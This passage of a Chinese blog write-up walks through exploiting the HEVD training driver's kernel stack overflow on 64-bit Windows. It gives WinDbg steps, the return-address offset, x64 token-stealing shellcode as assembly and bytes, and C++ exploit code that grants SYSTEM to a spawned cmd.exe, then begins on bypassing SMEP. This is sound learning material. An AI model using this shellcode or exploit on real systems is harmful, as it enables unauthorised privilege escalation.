EXP FUNCTION HERE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c-简单与功能交互"><a class="markdownIt-Anchor" href="#c-简单与功能交互"></a> C. 简单与功能交互</h2><p><img src="https://img.joe1sn.top/uploads/big/7a3682b00304fa6f8b1ed11bcbb9d718.png" alt="image-20240117192837142" /></p><p>这里要传一个空间和大小过去，这里用的到方式就是上一篇的IOCTL方式</p><p>这里我把所有的exp定义在<code>exp.c</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x50</span>] = <span class="string">&quot;aaaaa\0&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x30</span>;</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, stackspace, <span class="built_in">sizeof</span>(DWORDLONG), &amp;size, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a6c2dc60148f0770a7225e57d80fe2c7.png" alt="image-20240117195630472" /></p><p>驱动定义了一个2048大小的栈空间<code>v5</code>，但是写入的空间是我们可以控制的，尝试触发漏洞</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7874f17a8d4d02206828dc53d3cab9ac.png" alt="image-20240117202959678" /></p><p><img src="https://img.joe1sn.top/uploads/big/b65a46ebcb5df65ffc94318470bfc834.png" alt="image-20240117211228964" /></p><h2 id="d-开始调试"><a class="markdownIt-Anchor" href="#d-开始调试"></a> D. 开始调试</h2><p>之前符号表好像没加载上，在windbg中，HEVD的描述符一般在同级文件夹下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath+ &lt;pdb文件物理机上的路径&gt;</span><br></pre></td></tr></table></figure><p>然后再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec3aa1ca49a1c562e3f258276569051c.png" alt="image-20240117224344703" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /D /f HEVD!*</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e1effb52c7e61dbd37dec5d4ae999c44.png" alt="image-20240117224429242" /></p><p>下个断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure><p>这里运行下不崩溃的</p><p><img src="https://img.joe1sn.top/uploads/big/f006a81272655c32bcadac39d047e344.png" alt="image-20240117224828729" /></p><h3 id="i-windbg-调试常用"><a class="markdownIt-Anchor" href="#i-windbg-调试常用"></a> I. Windbg 调试常用</h3><p>在使用Windbg调试内核驱动程序时，你可以使用以下命令查看内存地址：</p><ul><li><p>64位查看内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dq &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>64位查看内存，单列显示，这在查看栈的情况是比较好用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqs &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt;</span><br></pre></td></tr></table></figure></li><li><p>在某处添加断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;内存虚拟地址&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp &lt;模块名&gt;!&lt;函数名&gt;</span><br><span class="line">//bp: break point 如 bp HEVD!TriggerBufferOverflowStack</span><br></pre></td></tr></table></figure></li><li><p>查看所有断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bl</span><br></pre></td></tr></table></figure></li><li><p>快速反汇编，适合查看gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u &lt;内存地址&gt;</span><br></pre></td></tr></table></figure></li><li><p>反汇编该地址对应的一段汇编，适合反汇编这段函数后选择断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uf &lt;内存地址&gt;</span><br><span class="line">uf &lt;模块名&gt;!&lt;函数名&gt;</span><br></pre></td></tr></table></figure></li><li><p>计算器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? &lt;计算表达式&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ii-内存布局"><a class="markdownIt-Anchor" href="#ii-内存布局"></a> II. 内存布局</h3><p><img src="https://img.joe1sn.top/uploads/big/da9b01520c9211cd93d3d115e7038832.png" alt="image-20240117225628917" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x80</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, size, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl, </span><br><span class="line">stackspace, size, </span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果引发溢出的话，看看kernel中的<code>v5</code>变量的布局</p><p><img src="https://img.joe1sn.top/uploads/big/533fe5848e91b5a10810b49521a1b4c0.png" alt="image-20240117231239916" /></p><p><img src="https://img.joe1sn.top/uploads/big/3f6b619a89d60563919834ae5442e701.png" alt="image-20240117231345354" /></p><p>这里的kernelBuffer就相当于用户模式下的“栈帧”</p><p>同时可以看到我们程序的内存</p><p><img src="https://img.joe1sn.top/uploads/big/fcfe15fb3b2fec30ee5ef6c8baf8a314.png" alt="image-20240117235653641" /></p><p><img src="https://img.joe1sn.top/uploads/big/28848667498b38b1a820bac1838ba971.png" alt="image-20240117235638456" /></p><p>这个时候顺便看一下rbp</p><p><img src="https://img.joe1sn.top/uploads/big/dcdee888e276aed122855f092a922429.png" alt="image-20240117231511587" /></p><p>在<code>pop</code>前下断点再运行到</p><p><img src="https://img.joe1sn.top/uploads/big/1a869ecdf8003008e6c2a871f2a17c02.png" alt="image-20240117234330859" /></p><p>所以是rsp+0x20+0x818就得到ret的地址</p><p>很明显这里可以通过栈溢出劫持返回地址，然后实现我们的shellcode</p><h3 id="iii-布置构思"><a class="markdownIt-Anchor" href="#iii-布置构思"></a> III. 布置构思</h3><ul><li>首先 <strong>驱动是64位</strong>，所以要用64位的思维去布局</li><li>其次，驱动和我们的程序内存之间是能访问的，所以我们在Ring3写shellcode，然后覆盖到Ring0去执行</li></ul><p>那么就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;a&quot;</span>*<span class="number">0x810</span>+p64(shellcode_addr)</span><br></pre></td></tr></table></figure><h1 id="shellcodeexp编写"><a class="markdownIt-Anchor" href="#shellcodeexp编写"></a> Shellcode+exp编写</h1><h2 id="a-shellcode"><a class="markdownIt-Anchor" href="#a-shellcode"></a> A. shellcode</h2><p>主要是用这篇：<a href="https://blog.xpnsec.com/hevd-stack-overflow/">Exploiting Windows 10 Kernel Drivers - Stack Overflow</a> 或者里面参考的两篇</p><p>主要目的就是拿去Token然后替换掉一个cmd.exe的Token实现提权，<strong>在下一篇文章中会详细提到</strong></p><blockquote><p>This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line">push rbx</span><br><span class="line">push rcx</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">mov rax, [gs:0x180 + 0x8]   ; Get &#x27;CurrentThread&#x27; from KPRCB</span><br><span class="line"></span><br><span class="line">mov rax, [rax + 0x220]       ; Get &#x27;Process&#x27; property from current thread</span><br><span class="line"></span><br><span class="line">next_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x41414141  ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)</span><br><span class="line">je found_cmd_process</span><br><span class="line">mov rax, [rax + 0x2e8]            ; If not found, go to next process</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp next_process</span><br><span class="line"></span><br><span class="line">found_cmd_process:</span><br><span class="line">mov rbx, rax                     ; Save our cmd.exe EPROCESS for later</span><br><span class="line"></span><br><span class="line">find_system_process:</span><br><span class="line">cmp dword [rax + 0x2e0], 0x00000004  ; Search for PID 4 (System process)</span><br><span class="line">je found_system_process</span><br><span class="line">mov rax, [rax + 0x2e8]</span><br><span class="line">sub rax, 0x2e8</span><br><span class="line">jmp find_system_process</span><br><span class="line"></span><br><span class="line">found_system_process:</span><br><span class="line">mov rcx, [rax + 0x358]            ; Take TOKEN from System process</span><br><span class="line">mov [rbx+0x358], rcx              ; And copy it to the cmd.exe process</span><br><span class="line"></span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rax</span><br><span class="line"></span><br><span class="line">; return goes here</span><br></pre></td></tr></table></figure></blockquote><h2 id="b-exp"><a class="markdownIt-Anchor" href="#b-exp"></a> B. EXP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc3</span>, <span class="number">0x83</span>, <span class="number">0xb8</span>, <span class="number">0xe0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x74</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xe8</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0xe8</span>,</span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0xe8</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0xc3</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD oldProtect;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, <span class="number">256</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">si.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">true</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FATAL: Error spawning cmd.exe\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Updating our shellcode to search for PID %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">*(DWORD*)((<span class="type">char</span>*)shellcode + <span class="number">27</span>) = pi.dwProcessId;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IO Complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b79e4ef722ad8e26cab88c67a5224aa1.png" alt="image-20240118002020265" /></p><p>然后到ret返回，查看返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4c65cdde199c60120b262e70f5635485.png" alt="image-20240118002154225" /></p><p>发现返回地地址已经被覆盖了，继续走下去</p><p><img src="https://img.joe1sn.top/uploads/big/4d009e4de60cbc5e00a14daaee7b7ab1.png" alt="image-20240118002325326" /></p><p>跳转到了shellcode了，再走两步</p><p><img src="https://img.joe1sn.top/uploads/big/777b9bff2c6634898c68adf02ca19a72.png" alt="image-20240118002504625" /></p><p>？？？</p><p><img src="https://img.joe1sn.top/uploads/big/1ab88b491fdcf9a1627f14b8a708a8ed.png" alt="image-20240118002613223" /></p><p><img src="https://img.joe1sn.top/uploads/big/b1b94aa13dbf421338b2bf2ac25a1827.png" alt="image-20240118003040168" /></p><p>说我在执行不可执行的内存，但是明明已经<code>VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</code></p><p>？？？越来越离谱了</p><p>尝试把shellcode移动到常量内存中试试，还是不行，接着我再进行ioctl之前pause一下，好像可以了</p><p><img src="https://img.joe1sn.top/uploads/big/a1b311e4b3eef101d2e0a98327149622.png" alt="image-20240118013041535" /></p><p>但是依然被说执行不可执行代码</p><h1 id="新的保护机制"><a class="markdownIt-Anchor" href="#新的保护机制"></a> 新的保护机制</h1><p>查了<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">其他的解法</a>，发现Windows 8过后微软添加了一个叫做SMEP保护的东西</p><p>你可以在这里查到关于Windows的所有保护机制：<a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><blockquote><ul><li><strong>监督器模式执行防护 (SMEP)</strong> ：帮助防止内核 (“监督器”) 在用户页面中执行代码，这是攻击者用于本地内核提升特权 (EOP) 的常见技术。 此配置需要在 Intel Ivy Bridge 或更高版本处理器中找到处理器支持，或者具有 PXN 支持的 ARM。</li></ul></blockquote><p>尝试关闭该保护后执行exp，<strong>但是发现是无法关闭的</strong>，由于内核的整体设计导致该保护在windows8及以上是不能被关闭的，那么就只能想办法绕过了</p><h2 id="a-smep保护机制及手动绕过"><a class="markdownIt-Anchor" href="#a-smep保护机制及手动绕过"></a> A. SMEP保护机制及手动绕过</h2><p>该保护机制强烈依赖于CPU的<code>RC4</code>寄存器，刚好我这里有《英特尔® 64 位和 IA-32 架构开发人员手册合订本》，翻出来看一下</p><p><img src="https://img.joe1sn.top/uploads/big/8dceeeeaf9a0251f0b359cf99c2c1099.png" alt="image-20240118103701065" /></p><blockquote><p>[机翻]从用户模式地址获取指令。<br />访问权限取决于 CR4.SMEP 的值：<br />• 如果CR4.SMEP = 0，访问权限取决于分页模式和IA32_EFER.NXE 的值：<br />— 对于 32 位分页或如果 IA32_EFER.NXE = 0，则可以从任何用户模式获取指令<br />地址。<br />— 对于 IA32_EFER.NXE = 1 的其他分页模式，可以通过每个分页结构条目中 XD 标志为 0 的转换从任何用户模式地址获取指令<br />控制翻译； 指令可能无法从任何用户模式地址获取<br />在任何控制转换的分页结构条目中 XD 标志为 1 的转换。<br />• 如果CR4.SMEP = 1，则不能从任何用户模式地址获取指令。<br />— 仅允许对管理员模式影子堆栈地址进行管理员模式影子堆栈访问<br />（往上看）。</p></blockquote><p>或许我们将<code>CR4.SMEP</code>的值设置为<code>0</code>，访问权限由页中的U/S标志位决定</p><p>CR4寄存器的结构如下（小端序顺序从右向左）：</p><p><img src="https://img.joe1sn.top/uploads/big/f39ac47992f037a218a801528db29eb5.png" alt="image-20240118105721560" /></p><p>不急，继续搜索发现了一份Intel关于SMEP的更详细的描述</p><p>文档：<a 